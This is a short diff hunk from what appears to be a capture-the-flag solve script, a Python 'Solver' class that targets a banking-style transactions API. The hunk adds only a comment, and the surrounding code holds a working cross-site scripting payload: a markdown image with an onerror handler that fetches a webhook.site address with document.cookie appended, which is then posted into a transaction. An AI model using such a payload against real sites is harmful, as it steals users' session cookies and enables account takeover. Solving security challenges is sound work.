@@ -33,6 +33,7 @@ class Solver:
         ADMIN_BSB = "069-420"
         ADMIN_ACCOUNT_NUMBER = "00000000"
 
+        # No spaces allowed
         PAYLOAD = f'''![x]("onerror="fetch(`{self.webhooksite_url}?q=${{document.cookie}}`))'''
 
         self.session.post(f"{API_BASE_URL}/transactions", json={
